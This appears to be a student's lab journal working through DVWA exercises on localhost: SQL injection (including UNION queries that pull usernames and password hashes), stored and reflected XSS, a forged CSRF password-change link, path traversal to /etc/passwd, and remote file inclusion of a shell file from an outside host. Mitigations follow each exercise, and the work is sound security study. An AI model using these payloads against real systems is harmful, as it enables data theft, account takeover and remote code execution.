# Day 25 - Web Application Security (DVWA Setup + SQL Injection)

-- Initialized web application security lab and performed basic SQL Injection testing using DVWA  

Objective

-- Set up DVWA in Kali Linux  
-- Understand SQL Injection fundamentals  
-- Perform basic authentication bypass  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Apache Server  
-- MySQL Database  

Step 1 – Start Required Services

-- Start Apache:

   sudo service apache2 start  

-- Start MySQL:

   sudo service mysql start  

Step 2 – Access DVWA

-- Open browser:

   http://localhost/dvwa  

-- Login credentials:

   username: admin  
   password: password  

Step 3 – Configure DVWA

-- Navigate to:
   DVWA Security  

-- Set security level:
   LOW  

-- Click:
   Create / Reset Database  

Step 4 – SQL Injection (Normal Input)

-- Go to:
   SQL Injection module  

-- Input:

   1  

-- Observation:
   -- Displays user information for ID 1  

Step 5 – SQL Injection Attack

-- Input:

   1' OR '1'='1  

-- Observation:
   -- Application returns all user records  

Explanation

-- Original query:

   SELECT * FROM users WHERE id = '1';

-- Injected query:

   SELECT * FROM users WHERE id = '1' OR '1'='1';

-- Result:
   -- Condition always TRUE → all data returned  

Security Issue

-- Application does not validate user input  
-- Directly executes SQL queries  

Basic Prevention

-- Use:
   -- Prepared Statements  
   -- Input validation  
   -- Parameterized queries  

Key Concepts Learned

-- SQL Injection allows manipulation of database queries  
-- Can lead to:
   -- Data leakage  
   -- Authentication bypass  

# Day 26 - Advanced SQL Injection (Data Extraction & Authentication Bypass)

-- Performed advanced SQL Injection techniques to extract sensitive data and bypass authentication  

Objective

-- Extract usernames and passwords from database  
-- Perform authentication bypass  
-- Understand real-world SQL Injection impact  
-- Learn mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Browser  

Setup

-- Ensure DVWA Security Level = LOW  

Step 1 – Identify Injection Point

-- Navigate to:
   SQL Injection module  

-- Test input:

   1  

-- Confirm application is vulnerable  

Step 2 – Authentication Bypass

-- Input:

   ' OR '1'='1  

-- Result:
   -- Bypasses login condition  

---

Step 3 – Extract Database Information

-- Use UNION-based SQL Injection:

   1' UNION SELECT null, database()-- -

-- Output:
   -- Displays current database name  

Step 4 – Extract Table Names

   1' UNION SELECT null, table_name FROM information_schema.tables-- -

-- Result:
   -- Lists tables (e.g., users)  

Step 5 – Extract Column Names

   1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Result:
   -- Shows columns (username, password)  

Step 6 – Extract User Credentials

   1' UNION SELECT user, password FROM users-- -

-- Result:
   -- Displays usernames and hashed passwords  

 Explanation

-- UNION operator combines results from multiple queries  
-- Enables attacker to retrieve hidden database data  

Security Impact

-- Full database exposure  
-- User credential leakage  
-- Unauthorized access  

Prevention Techniques

-- Use Prepared Statements  

Example (secure query):

   SELECT * FROM users WHERE id = ?  

-- Apply:
   -- Input validation  
   -- Parameterized queries  
   -- Least privilege access  

Key Concepts Learned

-- UNION-based SQL Injection  
-- Database enumeration  
-- Data extraction techniques  

# Day 27 - Cross-Site Scripting (XSS - Stored & Reflected)

-- Performed Stored and Reflected Cross-Site Scripting attacks and analyzed their impact  

Objective

-- Understand XSS vulnerabilities  
-- Perform Stored and Reflected XSS attacks  
-- Analyze impact of client-side code injection  
-- Implement mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Web Browser  

Setup

-- DVWA Security Level set to LOW  

What is XSS?

-- Cross-Site Scripting allows attackers to inject malicious scripts into web pages  
-- Executes in victim’s browser  

Part 1 – Stored XSS

Step 1:
-- Go to:
   XSS (Stored) module  

Step 2:
-- Input payload:

   <script>alert('Stored XSS')</script>

Step 3:
-- Submit form  

Result:
-- Script executes whenever page loads  

Part 2 – Reflected XSS

Step 1:
-- Go to:
   XSS (Reflected) module  

Step 2:
-- Input:

   <script>alert('Reflected XSS')</script>

Result:
-- Script executes immediately in response  

Explanation

-- Stored XSS:
   -- Payload saved in server/database  

-- Reflected XSS:
   -- Payload reflected in response  

Security Impact

-- Session hijacking  
-- Cookie theft  
-- Phishing attacks  
-- Defacement  

Mitigation Techniques

-- Input Validation  
-- Output Encoding  
-- Content Security Policy (CSP)  

Example CSP:
   Content-Security-Policy: default-src 'self'; script-src 'self'

Key Concepts Learned

-- Client-side code execution risk  
-- Persistent vs non-persistent XSS  
-- Importance of sanitizing user input  

# Day 28 - Cross-Site Request Forgery (CSRF)

-- Performed CSRF attack to change user password without authorization and analyzed prevention mechanisms  

Objective

-- Understand CSRF vulnerability  
-- Perform CSRF attack on DVWA  
-- Change user password without user consent  
-- Learn prevention using CSRF tokens  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Browser  

Setup

-- DVWA Security Level set to LOW  

What is CSRF?

-- CSRF tricks a user into performing unwanted actions on a web application where they are already authenticated  

Step 1 – Navigate to CSRF Module

-- Open:
   CSRF (Change Password)  

Step 2 – Observe Normal Request

-- Change password normally  

-- Example:
   new password: test123  

Step 3 – Capture Request URL

-- URL looks like:

   http://localhost/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change  

Step 4 – Create Malicious Link

-- Copy URL and modify password:

   http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change  

Step 5 – Execute Attack

-- Open link in browser  

Result:
-- Password gets changed without authentication prompt  

Explanation

-- Browser automatically sends session cookies  
-- Server trusts request → executes action  

Security Impact

-- Unauthorized actions  
-- Account takeover  
-- Data manipulation  

Prevention Techniques

-- Use CSRF Tokens  
-- Validate origin/referrer  
-- SameSite Cookies  

DVWA Protection Demo

-- Set security level to MEDIUM or HIGH  

-- Observe:
   -- Token added to request  
   -- Attack fails without valid token  

Key Concepts Learned

-- CSRF exploits authenticated sessions  
-- Lack of request validation leads to vulnerability   

Day 29 - File Inclusion Attacks (LFI & RFI)

-- Performed Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks to access sensitive files and execute external code  

Objective

-- Understand file inclusion vulnerabilities  
-- Perform Local File Inclusion (LFI)  
-- Perform Remote File Inclusion (RFI)  
-- Analyze impact and mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Web Browser  

Setup

-- DVWA Security Level set to LOW  

What is File Inclusion?

-- Allows attacker to include files through user input  
-- Can expose sensitive data or execute malicious code  

Part 1 = Local File Inclusion (LFI)

Step 1:
-- Go to:
   File Inclusion module  

Step 2:
-- Modify URL parameter:

   page=../../../../etc/passwd  

Result:
-- Displays system file (/etc/passwd)  

Explanation (LFI)

-- Application includes file directly from system  
-- Path traversal used to access sensitive files  


Part 2 – Remote File Inclusion (RFI)

Step 1:
-- Use external URL:

   page=http://example.com/shell.txt  

Result:
-- Executes remote file content  

Explanation (RFI)

-- Application allows external file inclusion  
-- Attacker can execute malicious code  

Security Impact

-- Exposure of sensitive system files  
-- Remote code execution  
-- Full system compromise  

Mitigation Techniques

-- Validate user input  
-- Restrict file paths  
-- Disable allow_url_include  
-- Use whitelisting for files  

Key Concepts Learned

-- Path traversal attacks  
-- Difference between LFI and RFI  
-- Risk of insecure file handling  
